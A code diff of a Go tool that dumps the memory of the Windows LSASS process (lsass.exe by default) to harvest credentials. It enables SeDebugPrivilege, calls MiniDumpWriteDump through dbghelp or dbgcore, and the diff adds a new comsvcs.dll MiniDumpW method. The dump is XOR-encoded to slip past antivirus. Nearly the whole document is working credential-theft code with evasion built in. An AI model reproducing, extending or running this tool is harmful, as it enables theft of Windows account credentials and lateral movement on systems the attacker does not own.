@@ -20,6 +20,7 @@ var (
 	infile  string
 	outfile string
 	process string
+	method  string
 	xorInt  int
 	xorByte byte
 )
@@ -28,6 +29,7 @@ func init() {
 	flag.StringVar(&infile, "in", "", "Input file to Xor")
 	flag.StringVar(&outfile, "out", "minidump.dmp", "minidump outfile")
 	flag.StringVar(&process, "p", "lsass.exe", "Process to dump")
+	flag.StringVar(&method, "m", "dbghelp", "[ dbghelp | dbgcore | comsvcs ]")
 	flag.IntVar(&xorInt, "x", 0x00, "Single Byte Xor Key")
 	xorByte = byte(xorInt)
 	flag.Parse()
@@ -36,7 +38,7 @@ func init() {
 func main() {
 
 	if infile != "" {
-		xorFileData, err := ioutil.ReadFile(infile)
+		xorFileData, err := os.ReadFile(infile)
 		if err != nil {
 			fmt.Println(err)
 			os.Exit(1)
@@ -46,21 +48,22 @@ func main() {
 			fmt.Println(err)
 			os.Exit(1)
 		}
+		fmt.Printf("File %s xor'd with %d and written to %s\n", infile, xorByte, outfile)
 		os.Exit(0)
 	}
 
-	mini, err := miniDump("", process, 0)
+	dumpdata, err := miniDump(outfile, process, 0)
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(1)
 	}
 
-	dumpdata := mini["FileContent"].([]byte)
 	err = writeXorContent(dumpdata, xorByte, outfile)
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(1)
 	}
+	fmt.Printf("File written to %s\nXor byte: %d", outfile, xorByte)
 }
 
 func writeXorContent(data []byte, key byte, file string) (err error) {
@@ -69,100 +72,90 @@ func writeXorContent(data []byte, key byte, file string) (err error) {
 		xordDump[i] = b ^ key
 	}
 	err = ioutil.WriteFile(file, xordDump, 0644)
-	fmt.Printf("File written to %s\nXor key: %d", file, key)
 	return
 }
 
-// miniDump will attempt to perform use the Windows MiniDumpWriteDump API operation on the provided process, and returns
-// the raw bytes of the dumpfile back as an upload to the server.
-// Touches disk during the dump process, in the OS default temporary or provided temporary directory
-func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
-	var mini map[string]interface{}
-	mini = make(map[string]interface{})
-	var err error
-
-	// Make sure temporary directory exists before executing miniDump functionality
-	if tempDir != "" {
-		d, errS := os.Stat(tempDir)
-		if os.IsNotExist(errS) {
-			return mini, fmt.Errorf("the provided directory does not exist: %s", tempDir)
-		}
-		if d.IsDir() != true {
-			return mini, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
-		}
-	} else {
-		tempDir = os.TempDir()
-	}
-
-	// Get the process PID or name
-	mini["ProcName"], mini["ProcID"], err = getProcess(process, inPid)
+func miniDump(outfile, process string, inPid uint32) (mini []byte, err error) {
+	procID, err := getProcess(process, inPid)
 	if err != nil {
-		return mini, err
+		return
 	}
 
-	// Get debug privs (required for dumping processes not owned by current user)
 	err = sePrivEnable("SeDebugPrivilege")
 	if err != nil {
-		return mini, err
+		return
 	}
 
-	// Get a handle to process
-	hProc, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, mini["ProcID"].(uint32))
-	if err != nil {
-		return mini, err
+	switch method {
+	case "comsvcs":
+		mini, err = comsvcsDumper(procID)
+	default:
+		mini, err = dbgDumper(procID, method)
 	}
-
-	// Set up the temporary file to write to, automatically remove it once done
-	// TODO: Work out how to do this in memory
-	f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
-	if tempErr != nil {
-		return mini, tempErr
-	}
-
-	// Remove the file after the function exits, regardless of error nor not
-	defer os.Remove(f.Name())
-
-	// Load MiniDumpWriteDump function from DbgHelp.dll
-	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
-	miniDump := k32.NewProc("MiniDumpWriteDump")
-
-	/*
-		BOOL MiniDumpWriteDump(
-		  HANDLE                            hProcess,
-		  DWORD                             ProcessId,
-		  HANDLE                            hFile,
-		  MINIDUMP_TYPE                     DumpType,
-		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
-		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
-		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
-		);
-	*/
-	// Call Windows MiniDumpWriteDump API
-	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(mini["ProcID"].(uint32)), f.Fd(), 3, 0, 0, 0)
-	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does
-
-	if r != 0 {
-		mini["FileContent"], err = ioutil.ReadFile(f.Name())
-		if err != nil {
-			f.Close()
-			return mini, err
-		}
-	}
-	return mini, nil
+	return
 }
 
-// getProcess takes in a process name OR a process ID and returns a pointer to the process handle, the process name,
-// and the process ID.
-func getProcess(name string, pid uint32) (string, uint32, error) {
+func dbgDumper(pid uint32, dll string) (mini []byte, err error) {
+	hProc, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
+	if err != nil {
+		return
+	}
+
+	f, tempErr := os.CreateTemp("", "*.tmp")
+	if tempErr != nil {
+		return
+	}
+	defer os.Remove(f.Name())
+
+	// BOOL MiniDumpWriteDump(
+	//   HANDLE                            hProcess,
+	//   DWORD                             ProcessId,
+	//   HANDLE                            hFile,
+	//   MINIDUMP_TYPE                     DumpType,
+	//   PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
+	//   PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
+	//   PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
+	// );
+	dbgDll := windows.NewLazySystemDLL(dll)
+	miniDump := dbgDll.NewProc("MiniDumpWriteDump")
+	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(uint32(pid)), f.Fd(), 3, 0, 0, 0)
+	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does
+	if r != 0 {
+		mini, err = os.ReadFile(f.Name())
+		if err != nil {
+			f.Close()
+			return
+		}
+	}
+	return
+}
+
+func comsvcsDumper(pid uint32) (mini []byte, err error) {
+	tmpFile := "temp"
+	comsvcs := windows.NewLazySystemDLL("comsvcs.dll")
+	miniDump := comsvcs.NewProc("MiniDumpW")
+
+	args := fmt.Sprintf("%d %s full", pid, tmpFile)
+	argsPtr := uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(args)))
+	defer os.Remove(tmpFile)
+	r, _, _ := miniDump.Call(uintptr(0), uintptr(0), argsPtr)
+
+	if r != 0 {
+		mini, err = os.ReadFile(tmpFile)
+	}
+	return
+}
+
+func getProcess(name string, pid uint32) (uint32, error) {
 	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
 
 	if pid <= 0 && name == "" {
-		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
+		return 0, fmt.Errorf("a process name OR process ID must be provided")
 	}
 
 	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
 	if snapshotHandle < 0 || err != nil {
-		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
+		return 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
 	}
 	defer syscall.CloseHandle(snapshotHandle)
 
@@ -170,7 +163,7 @@ func getProcess(name string, pid uint32) (string, uint32, error) {
 	process.Size = uint32(unsafe.Sizeof(process))
 	err = syscall.Process32First(snapshotHandle, &process)
 	if err != nil {
-		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
+		return 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
 	}
 
 	for {
@@ -183,11 +176,11 @@ func getProcess(name string, pid uint32) (string, uint32, error) {
 		}
 		if pid > 0 {
 			if process.ProcessID == pid {
-				return processName, pid, nil
+				return pid, nil
 			}
 		} else if name != "" {
 			if processName == name {
-				return name, process.ProcessID, nil
+				return process.ProcessID, nil
 			}
 		}
 		err = syscall.Process32Next(snapshotHandle, &process)
@@ -195,11 +188,9 @@ func getProcess(name string, pid uint32) (string, uint32, error) {
 			break
 		}
 	}
-	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
+	return 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
 }
 
-// sePrivEnable adjusts the privileges of the current process to add
-// the passed in string. Good for setting 'SeDebugPrivilege'
 func sePrivEnable(s string) error {
 	type LUID struct {
 		LowPart  uint32
@@ -224,7 +215,6 @@ func sePrivEnable(s string) error {
 		return err
 	}
 	syscall.OpenProcessToken(
-		//r, a, e := procOpenProcessToken.Call(
 		thsHandle,                       //  HANDLE  ProcessHandle,
 		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
 		&tokenHandle,                    //	PHANDLE TokenHandle
